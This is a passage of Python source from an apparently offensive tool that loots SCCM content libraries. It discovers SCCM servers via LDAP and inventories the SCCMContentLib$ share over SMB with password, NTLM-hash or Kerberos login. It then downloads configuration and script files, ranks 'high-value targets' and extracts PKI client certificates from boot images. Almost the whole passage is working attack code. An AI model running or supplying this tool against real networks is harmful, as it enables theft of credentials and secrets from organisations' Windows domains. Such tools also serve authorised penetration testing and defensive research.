                        return
                    else:
                        selected_set = set()
                        for part in choice.split(','):
                            part = part.strip()
                            if '-' in part:
                                try:
                                    start, end = part.split('-', 1)
                                    for n in range(int(start), int(end) + 1):
                                        if 1 <= n <= len(file_details):
                                            selected_set.add(n)
                                except ValueError:
                                    pass
                            else:
                                try:
                                    n = int(part)
                                    if 1 <= n <= len(file_details):
                                        selected_set.add(n)
                                except ValueError:
                                    pass

                if not selected_set:
                    logging.info("No files selected. Exiting download phase.")
                    return

                filtered_download = {}
                filtered_bytes = 0
                for idx, (hv_hash, fname, fsize, cat, hv_mark) in enumerate(file_details, 1):
                    if idx in selected_set:
                        filtered_download[hv_hash] = fname
                        filtered_bytes += fsize

                logging.info(f"Selected {len(filtered_download)} files ({format_filesize(filtered_bytes)}) for download")
                if len(filtered_download) < len(downloadlist):
                    skipped = len(downloadlist) - len(filtered_download)
                    logging.info(f"Skipping {skipped} unselected files")
                downloadlist = filtered_download

                if not downloadlist:
                    logging.info("No files to download after selection.")
                    return

                logging.info("")
                logging.info(f"Phase 2/2: Downloading {len(downloadlist)} files to {lootpath}/...")
                download_start = time.time()
                already = 0
                dl_errors = 0
                dl_done = 0
                total_dl = len(downloadlist)

                for hashvalue, filename in downloadlist.items():
                    outfile = lootpath + "/" + hashvalue[0:4] + "-" + filename
                    if os.path.isfile(outfile):
                        already += 1
                        dl_done += 1
                        print_progress("  Downloading", dl_done, total_dl, download_start, f"| Skipped: {already} | New: {dl_done - already}")
                        continue
                    share = "\\" + "FileLib" + "\\" + hashvalue[0:4] + "\\" + hashvalue
                    try:
                        with open(outfile, 'wb') as wf:
                            smbClient.getFile("SCCMContentLib$", share, wf.write)
                    except Exception as e:
                        dl_errors += 1
                        if dl_errors <= 3:
                            logging.warning(f"\nError downloading {hashvalue}: {e}")
                        elif dl_errors == 4:
                            logging.warning("\nSuppressing further download errors...")
                    dl_done += 1
                    print_progress("  Downloading", dl_done, total_dl, download_start, f"| Skipped: {already} | New: {dl_done - already - dl_errors}")

                if total_dl > 0:
                    sys.stdout.write("\n")
                elapsed = time.time() - download_start
                new_dl = total_dl - already - dl_errors
                logging.info(f"Download complete: {new_dl} new, {already} skipped (already existed), {dl_errors} errors in {format_elapsed(elapsed)}")
                if dl_errors > 0:
                    logging.info(f"  {dl_errors} files failed to download (check permissions or share access)")
                logging.info(f"Output directory: {os.path.abspath(lootpath)}")

            inventory_file = options.cmlootinventory
            if options.cmlootinventory:
                if debug_logging:
                    logging.debug(f"Creating inventory file: {inventory_file}")
                create_inventory()
            if options.cmlootdownload:
                if debug_logging:
                    logging.debug(f"Downloading files from inventory: {options.cmlootdownload}")
                downloadfiles()
                if options.classify:
                    classify_loot(options.lootpath)

        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))

    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))

def find_sccm_servers(domain, username, password, lmhash, nthash, ldap_port):
    """
    Finds Configuration Manager server via LDAP query and writes to file
    """
    if debug_logging:
        logging.debug(f"Searching for SCCM servers in domain: {domain}")
    filename = "./sccmhosts.txt"
    base_dn = fqdn_to_base_dn(domain)
    logging.info(f"Querying LDAP at {domain}:{ldap_port} for mSSMSManagementPoint objects...")
    logging.info(f"LDAP base DN: {base_dn}")
    try:
        server = Server(domain, port=ldap_port, get_info=ALL)
        ldap_user = username + "@" + domain
        if nthash:
            ntlm_hash = (lmhash if lmhash else "") + ":" + nthash
            with Connection(server, user=ldap_user, password=ntlm_hash,
                          auto_bind=True,
                          authentication=NTLM) as conn:
                conn.search(base_dn, '(objectclass=mSSMSManagementPoint)', attributes=['mSSMSMPName'])
                sccm_hosts = _extract_sccm_hosts(conn)
        else:
            with Connection(server, ldap_user, password, auto_bind=True) as conn:
                conn.search(base_dn, '(objectclass=mSSMSManagementPoint)', attributes=['mSSMSMPName'])
                sccm_hosts = _extract_sccm_hosts(conn)
        with open(filename, 'w') as wf:
            for host in sccm_hosts:
                wf.write(host + "\n")
        if sccm_hosts:
            logging.info(f"Found {len(sccm_hosts)} SCCM Management Point(s):")
            for h in sccm_hosts:
                logging.info(f"  - {h}")
            logging.info(f"Written to {filename}")
        else:
            logging.info("No SCCM Management Points found via LDAP")
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))

def _extract_sccm_hosts(conn):
    sccm_hosts = []
    for entry in conn.entries:
        mssmsmp_name = entry.mSSMSMPName
        if mssmsmp_name:
            sccm_hosts += mssmsmp_name
    return sccm_hosts

def fqdn_to_base_dn(fqdn):
    """
    Convert a Fully Qualified Domain Name (FQDN) to a Base DN (Distinguished Name) format.
    """
    if debug_logging:
        logging.debug(f"Converting FQDN to Base DN: {fqdn}")
    components = fqdn.split('.')
    base_dn_components = [f"DC={component}" for component in components]
    base_dn = ','.join(base_dn_components)
    return base_dn.upper()

def sort_and_uniq_file(file_path):
    """
    Sort the contents of a file and remove duplicates (ignoring case).
    """
    if debug_logging:
        logging.debug(f"Sorting and removing duplicates from file: {file_path}")
    try:
        with open(file_path, 'r') as f:
            lines = f.readlines()
        lower_to_original = {line.lower(): line for line in lines}
        sorted_unique_lines = sorted(lower_to_original.keys())
        with open(file_path, 'w') as f:
            for line in sorted_unique_lines:
                f.write(lower_to_original[line])
    except IOError as e:
        print(f"An error occurred: {e}")

def main():
    logger.init()
    print(version.BANNER)
    parser = argparse.ArgumentParser(add_help = True, description = "SCCM Content Library looter - enumerate and download files from SCCMContentLib$ share")

    parser.add_argument('target', nargs='?', default=None, help='[[domain/]username[:password]@]<targetName or address>. Not required for -classify or -elevate5.')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    
    group = parser.add_argument_group('cmloot')
    group.add_argument('-cmlootinventory', default="sccmfiles.txt", action='store', help='File to store all indexed filepaths found in DataLib folder. Default: sccmfiles.txt', metavar = "sccmfiles.txt")
    group.add_argument('-cmlootdownload', action='store', help='Start downloading files from inventory file. Ex: -cmlootdownload sccmfiles.txt', metavar = "sccmfiles.txt")
    group.add_argument('-extensions', type=str, default=["XML","INI","CONFIG","PS1","VBS"], nargs='*',  help='Files to download from inventory file. Default: -extensions XML INI CONFIG')
    group.add_argument('-lootpath', default="CMLootOut", action='store', help='Output directory for downloaded files. Default: CMLootOut', metavar = "CMLootOut")
    group.add_argument('-classify', action='store_true', default=False, help='Classify downloaded files by type and highlight high-value targets. No target required - operates on local loot directory.')
    group.add_argument('-elevate5', action='store_true', default=False, help='ELEVATE-5: Extract PKI client auth certificates from downloaded WIM/ISO boot images. No target required - operates on local loot directory.')
    group.add_argument('-yes-download', action='store_true', default=False, help='Skip the file selection prompt and download all matching files (non-interactive mode)')
    group.add_argument('-auto', action='store_true', default=False, help='Full pipeline: find SCCM servers (LDAP) -> inventory -> download -> classify. If -target-file is also given, skips LDAP.')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help="Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line")
    group.add_argument('-aesKey', action="store", metavar="hex key", help="AES key to use for Kerberos Authentication (128 or 256 bits)")

    group = parser.add_argument_group('connection')

    group.add_argument('-dc-ip', action='store', metavar="ip address", help="IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter")
    group.add_argument('-target-ip', action='store', metavar="ip address", help="IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it")
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')
    group.add_argument('-target-file', action='store', metavar="target file", 
                       help='File with specifies one target (host) per line. If omitted it will use whatever was specified as target. ')
    
    group = parser.add_argument_group('findsccmservers')
    group.add_argument('-findsccmservers', action='store_true', default=False, help='Finds SCCM servers using LDAP')
    group.add_argument('-ldapport', action='store', default=389, help='LDAP port. Default 389, LDAPS 636.')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    global debug_logging
    debug_logging = False
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug("Debug mode enabled")
        logging.debug(version.getInstallationPath())
        debug_logging = True
    else:
        logging.getLogger().setLevel(logging.INFO)

    local_modes = options.classify or options.elevate5

    if local_modes and not options.target:
        if options.classify:
            classify_loot(options.lootpath)
            sys.exit(0)
        if options.elevate5:
            elevate5_analyze(options.lootpath)
            sys.exit(0)

    if not options.target and not local_modes:
        parser.error("target is required unless using -classify or -elevate5")

    domain, username, password, address = parse_target(options.target)

    if options.target_ip is None:
        options.target_ip = address

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    inv_file = options.cmlootinventory
    ext_display = ', '.join(options.extensions)

    if options.classify:
        classify_loot(options.lootpath)
        sys.exit(0)

    if options.elevate5:
        elevate5_analyze(options.lootpath)
        sys.exit(0)

    if options.auto:
        log_banner("AUTO MODE: full pipeline")
        logging.info("This will automatically execute the following steps:")
        logging.info("  1. Discover SCCM servers via LDAP (or use -target-file)")
        logging.info("  2. Connect to each server and index the Content Library (DataLib)")
        logging.info("  3. Download files matching extensions: %s" % ext_display)
        logging.info("")
        total_start = time.time()

        if options.target_file:
            targets_file = options.target_file
            log_banner("AUTO 1/3: SCCM TARGET DISCOVERY")
            logging.info(f"Using target file: {targets_file} (skipping LDAP discovery)")
        else:
            if not domain:
                logging.error("Cannot run LDAP discovery without a domain. Provide domain/ in the target or use -target-file.")
                sys.exit(1)
            log_banner("AUTO 1/3: SCCM TARGET DISCOVERY (LDAP)")
            logging.info(f"Searching AD for mSSMSManagementPoint objects in {domain}")
            find_sccm_servers(domain, username, password, lmhash, nthash, options.ldapport)
            targets_file = "./sccmhosts.txt"

        if not os.path.isfile(targets_file):
            logging.error(f"Target file {targets_file} not found. Did discovery fail?")
            sys.exit(1)

        try:
            raw_targets = open(targets_file, 'r').readlines()
        except Exception as e:
            logging.error(f"Cannot read {targets_file}: {e}")
            sys.exit(1)

        targets = []
        for t in raw_targets:
            t = t.replace("\r", "").replace("\n", "").strip()
            if t:
                targets.append(t)

        if not targets:
            logging.error("No SCCM targets found. Exiting.")
            sys.exit(1)

        logging.info("")
        logging.info(f"Targets: {len(targets)} SCCM server(s) to process")
        for i, h in enumerate(targets, 1):
            logging.info(f"  {i}. {h}")
        logging.info("")

        multi = len(targets) > 1
        all_inv_files = []
        successful_targets = []

        log_banner("AUTO 2/3: BUILD INVENTORY")
        if multi:
            logging.info("Each target gets its own inventory file. They will be merged afterwards.")
        for idx, t in enumerate(targets, 1):
            logging.info(f"")
            logging.info(f"--- Target {idx}/{len(targets)}: {t} ---")
            if multi:
                per_host_inv = f"sccmfiles_{t.split('.')[0]}.txt"
            else:
                per_host_inv = inv_file

            address = t
            options.target_ip = t
            options.cmlootinventory = per_host_inv
            options.cmlootdownload = None
            try:
                connect_to_sccm(address, username, password, domain, lmhash, nthash, options, multi)
                if os.path.isfile(per_host_inv):
                    all_inv_files.append(per_host_inv)
                    successful_targets.append(t)
                    with open(per_host_inv, 'r') as cf:
                        count = sum(1 for _ in cf)
                    logging.info(f"Inventory for {t}: {count} entries in {per_host_inv}")
                else:
                    logging.warning(f"No inventory file created for {t} (share access may have failed)")
            except Exception as e:
                logging.error(f"Failed to inventory {t}: {e}")

        if not all_inv_files:
            logging.error("No inventories were created. Cannot proceed to download.")
            sys.exit(1)

        if multi:
            merged_inv = inv_file
            seen = set()
            total_entries = 0
            with open(merged_inv, 'w') as outf:
                for inv in all_inv_files:
                    if not os.path.isfile(inv):
                        continue
                    with open(inv, 'r') as inf:
                        for line in inf:
                            if line.lower() not in seen:
                                seen.add(line.lower())
                                outf.write(line)
                                total_entries += 1
            sort_and_uniq_file(merged_inv)
            logging.info("")
            logging.info(f"Merged {len(all_inv_files)} inventories into {merged_inv} ({total_entries} unique entries)")
            download_inv = merged_inv
        else:
            download_inv = all_inv_files[0] if all_inv_files else inv_file

        log_banner("AUTO 3/3: DOWNLOAD FILES")
        logging.info(f"Downloading from inventory: {download_inv}")
        logging.info(f"Extensions: {ext_display}")
        logging.info(f"Output: {options.lootpath}/")
        logging.info("")
        for idx, t in enumerate(successful_targets, 1):
            logging.info(f"--- Downloading from {t} ({idx}/{len(successful_targets)}) ---")
            address = t
            options.target_ip = t
            options.cmlootinventory = inv_file
            options.cmlootdownload = download_inv
            connect_to_sccm(address, username, password, domain, lmhash, nthash, options, True)

        total_elapsed = time.time() - total_start
        logging.info("")

        classify_loot(options.lootpath)

        log_banner("AUTO COMPLETE")
        logging.info(f"Total time:  {format_elapsed(total_elapsed)}")
        logging.info(f"Inventory:   {download_inv}")
        logging.info(f"Downloads:   {os.path.abspath(options.lootpath)}/")
        logging.info(f"Extensions:  {ext_display}")
        if os.path.isdir(options.lootpath):
            dl_count = len([f for f in os.listdir(options.lootpath) if os.path.isfile(os.path.join(options.lootpath, f))])
            logging.info(f"Files in output: {dl_count}")
        logging.info(SEPARATOR)
        sys.exit(0)

    if options.findsccmservers:
        if debug_logging:
            logging.debug("Starting SCCM server discovery")
        find_sccm_servers(domain, username, password, lmhash, nthash, options.ldapport)
        if not options.target_file:
            sys.exit(0)
    
    if options.target_file:
        if debug_logging:
            logging.debug(f"Reading targets from file: {options.target_file}")
        try:
            targets = open(options.target_file, 'r').readlines()
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
        logging.info(f"Found {len(targets)} SCCM target(s) in {options.target_file}")
        for t in targets:
            t = t.replace("\r", "").replace("\n", "").strip()
            logging.info(f"Using target {t}")
            address = t
            options.target_ip = t
            connect_to_sccm(address, username, password, domain, lmhash, nthash, options, True)
    else:
        if debug_logging:
            logging.debug(f"Connecting to single target: {address}")
        connect_to_sccm(address, username, password, domain, lmhash, nthash, options, False)

if __name__ == "__main__":
    main()
